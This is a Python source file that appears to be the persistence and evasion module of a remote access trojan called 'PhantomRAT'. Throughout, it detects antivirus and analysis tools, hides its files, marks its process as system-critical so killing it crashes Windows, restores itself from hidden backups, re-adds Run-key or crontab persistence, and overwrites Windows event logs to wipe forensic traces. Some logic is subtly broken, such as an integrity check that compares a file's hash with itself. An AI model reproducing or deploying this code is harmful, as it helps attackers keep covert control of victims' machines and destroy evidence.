import os
import sys
import time
import random
import hashlib
import shutil
import subprocess
import platform
import psutil
import threading
import ctypes
import winreg
import json
from datetime import datetime

def self_delete_if_detected():
    """Check for detection and self-delete if needed"""
    detection_indicators = [
        # Check for common security tools
        check_processes(['wireshark', 'procmon', 'processhacker', 'autoruns', 'sysinternals']),
        check_files(['C:\\Program Files\\AVG', 'C:\\Program Files\\Avast', 'C:\\Program Files\\Kaspersky']),
        check_registry_keys(['SOFTWARE\\Microsoft\\Windows Defender']),
        high_cpu_usage(),
        multiple_instances(),
    ]
    
    if any(detection_indicators):
        print("[!] Detection indicators found, initiating self-destruct...")
        schedule_self_destruct(60)  # Delete in 60 seconds
        return True
    
    return False

def check_processes(process_names):
    """Check if security processes are running"""
    try:
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            if any(p in name for p in process_names):
                return True
    except:
        pass
    return False

def check_files(paths):
    """Check for security software files"""
    for path in paths:
        if os.path.exists(path):
            return True
    return False

def check_registry_keys(keys):
    """Check Windows registry for security software"""
    if platform.system() != 'Windows':
        return False
    
    try:
        for key in keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key)
                return True
            except:
                pass
    except:
        pass
    
    return False

def high_cpu_usage():
    """Check for high CPU usage (sandbox indicator)"""
    try:
        return psutil.cpu_percent(interval=1) > 90
    except:
        return False

def multiple_instances():
    """Check if multiple instances are running"""
    current_pid = os.getpid()
    current_name = os.path.basename(sys.argv[0])
    
    try:
        count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == current_name and proc.info['pid'] != current_pid:
                count += 1
        return count > 2
    except:
        return False

def schedule_self_destruct(delay_seconds):
    """Schedule self-destruction after delay"""
    def self_destruct():
        time.sleep(delay_seconds)
        try:
            # Delete current file
            current_file = os.path.abspath(sys.argv[0])
            
            if platform.system() == 'Windows':
                # Windows deletion
                cmd = f'ping 127.0.0.1 -n {delay_seconds+1} > nul && del /f "{current_file}"'
                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Linux deletion
                cmd = f'sleep {delay_seconds} && rm -f "{current_file}"'
                subprocess.Popen(cmd, shell=True)
            
            # Also delete related files
            for file in os.listdir('.'):
                if 'phantomrat' in file.lower() and file.endswith('.py'):
                    try:
                        os.remove(file)
                    except:
                        pass
            
            # Exit process
            os._exit(0)
            
        except:
            os._exit(0)
    
    thread = threading.Thread(target=self_destruct, daemon=True)
    thread.start()

def anti_removal():
    """Implement anti-removal techniques"""
    
    # 1. File locking (Windows)
    if platform.system() == 'Windows':
        try:
            current_file = os.path.abspath(sys.argv[0])
            # Keep file open to prevent deletion
            file_handle = open(current_file, 'a+')
            # Keep reference to prevent GC
            anti_removal.file_handle = file_handle
        except:
            pass
    
    # 2. Process protection (Windows)
    if platform.system() == 'Windows':
        try:
            # Set critical process (causes BSOD if killed)
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        except:
            pass
    
    # 3. Watchdog process
    start_watchdog()
    
    # 4. File attribute manipulation
    try:
        if platform.system() == 'Windows':
            current_file = os.path.abspath(sys.argv[0])
            # Set as system file
            ctypes.windll.kernel32.SetFileAttributesW(current_file, 2)  # FILE_ATTRIBUTE_HIDDEN
            ctypes.windll.kernel32.SetFileAttributesW(current_file, 4)  # FILE_ATTRIBUTE_SYSTEM
    except:
        pass

def start_watchdog():
    """Start watchdog process to restore if killed"""
    def watchdog():
        while True:
            time.sleep(30)
            
            current_file = os.path.abspath(sys.argv[0])
            current_pid = os.getpid()
            
            # Check if main process is still running
            try:
                psutil.Process(current_pid)
            except psutil.NoSuchProcess:
                # Process was killed, restore
                restore_from_backup()
                break
    
    thread = threading.Thread(target=watchdog, daemon=True)
    thread.start()

def restore_from_backup():
    """Restore from backup if deleted"""
    backup_locations = [
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
        os.path.join(os.environ.get('TEMP', ''), 'phantom_backup'),
        os.path.join(os.path.expanduser('~'), '.config', 'phantom'),
        'C:\\Windows\\System32\\drivers\\etc\\phantom'
    ]
    
    for location in backup_locations:
        backup_file = os.path.join(location, 'phantom_backup.exe')
        if os.path.exists(backup_file):
            try:
                # Restore to original location
                original_path = os.path.abspath(sys.argv[0])
                shutil.copy2(backup_file, original_path)
                
                # Execute
                if platform.system() == 'Windows':
                    subprocess.Popen([original_path], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    subprocess.Popen(['python3', original_path])
                
                break
            except:
                continue

def self_heal():
    """Self-healing mechanism"""
    def heal_loop():
        while True:
            time.sleep(300)  # Check every 5 minutes
            
            try:
                # 1. Verify file integrity
                current_file = os.path.abspath(sys.argv[0])
                if not os.path.exists(current_file):
                    # File was deleted, restore from memory
                    restore_from_memory()
                    continue
                
                # 2. Check for modifications
                expected_hash = calculate_file_hash(current_file)
                if not verify_integrity(current_file, expected_hash):
                    # File was modified, restore
                    restore_from_backup()
                    continue
                
                # 3. Check persistence
                if not check_persistence():
                    # Persistence removed, re-add
                    from phantomrat_persistence import add_persistence
                    add_persistence()
                
                # 4. Create backups
                create_backup()
                
            except Exception as e:
                print(f"Heal error: {e}")
    
    thread = threading.Thread(target=heal_loop, daemon=True)
    thread.start()

def calculate_file_hash(filepath):
    """Calculate SHA256 hash of file"""
    try:
        hasher = hashlib.sha256()
        with open(filepath, 'rb') as f:
            while chunk := f.read(4096):
                hasher.update(chunk)
        return hasher.hexdigest()
    except:
        return None

def verify_integrity(filepath, expected_hash):
    """Verify file hasn't been modified"""
    if not expected_hash:
        return False
    
    current_hash = calculate_file_hash(filepath)
    return current_hash == expected_hash

def restore_from_memory():
    """Restore executable from memory"""
    # This is a simplified version
    # In reality, you'd have the binary stored encrypted in memory
    print("[!] File deleted, attempting restoration...")
    
    # For now, just exit and let watchdog handle it
    os._exit(1)

def create_backup():
    """Create backup of executable"""
    backup_locations = [
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'phantom_backup.exe'),
        os.path.join(os.environ.get('TEMP', ''), 'phantom_backup.exe'),
        os.path.join(os.path.expanduser('~'), '.config', 'phantom_backup')
    ]
    
    current_file = os.path.abspath(sys.argv[0])
    
    for location in backup_locations:
        try:
            os.makedirs(os.path.dirname(location), exist_ok=True)
            shutil.copy2(current_file, location)
            
            # Hide file
            if platform.system() == 'Windows':
                ctypes.windll.kernel32.SetFileAttributesW(location, 2)
            else:
                os.system(f'chmod 600 "{location}"')
            
            break
        except:
            continue

def check_persistence():
    """Check if persistence mechanisms are still active"""
    if platform.system() == 'Windows':
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run")
            value, _ = winreg.QueryValueEx(key, "PhantomRAT")
            return bool(value)
        except:
            return False
    else:
        # Check crontab
        try:
            with open('/etc/crontab', 'r') as f:
                content = f.read()
                return 'phantomrat' in content.lower()
        except:
            return False

def stealth_execution():
    """Execute in stealth mode"""
    # 1. Lower priority
    try:
        p = psutil.Process(os.getpid())
        p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    except:
        pass
    
    # 2. Memory optimization
    try:
        import gc
        gc.disable()
    except:
        pass
    
    # 3. Network stealth
    try:
        import socket
        # Use raw sockets for certain operations
    except:
        pass
    
    # 4. Timing obfuscation
    execution_delay = random.uniform(1, 10)
    time.sleep(execution_delay)

def clean_traces():
    """Clean forensic traces"""
    # Clean logs
    if platform.system() == 'Windows':
        log_files = [
            'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
            'C:\\Windows\\System32\\winevt\\Logs\\System.evtx',
            'C:\\Windows\\System32\\winevt\\Logs\\Application.evtx'
        ]
        
        for log_file in log_files:
            try:
                if os.path.exists(log_file):
                    # Overwrite with zeros
                    with open(log_file, 'wb') as f:
                        f.write(os.urandom(os.path.getsize(log_file)))
            except:
                pass
    
    # Clean temporary files
    temp_dirs = [
        os.environ.get('TEMP', ''),
        os.environ.get('TMP', ''),
        '/tmp',
        '/var/tmp'
    ]
    
    for temp_dir in temp_dirs:
        if os.path.exists(temp_dir):
            try:
                for file in os.listdir(temp_dir):
                    if 'phantom' in file.lower():
                        file_path = os.path.join(temp_dir, file)
                        try:
                            os.remove(file_path)
                        except:
                            pass
            except:
                pass
    
    # Clean registry (Windows)
    if platform.system() == 'Windows':
        try:
            keys_to_delete = [
                r"Software\Microsoft\Windows\CurrentVersion\Run\PhantomRAT",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce\PhantomRAT",
                r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
            ]
            
            for key_path in keys_to_delete:
                try:
                    root, subkey = key_path.split('\\', 1)
                    root_key = getattr(winreg, f'HKEY_{root.upper()}')
                    winreg.DeleteKey(root_key, subkey)
                except:
                    pass
        except:
            pass

if __name__ == "__main__":
    # Test survival functions
    print("Testing survival mechanisms...")
    
    # Create backup
    create_backup()
    
    # Start self-healing
    self_heal()
    
    # Check persistence
    if check_persistence():
        print("Persistence active")
    else:
        print("Adding persistence...")
        from phantomrat_persistence import add_persistence
        add_persistence()
    
    print("Survival mechanisms initialized")
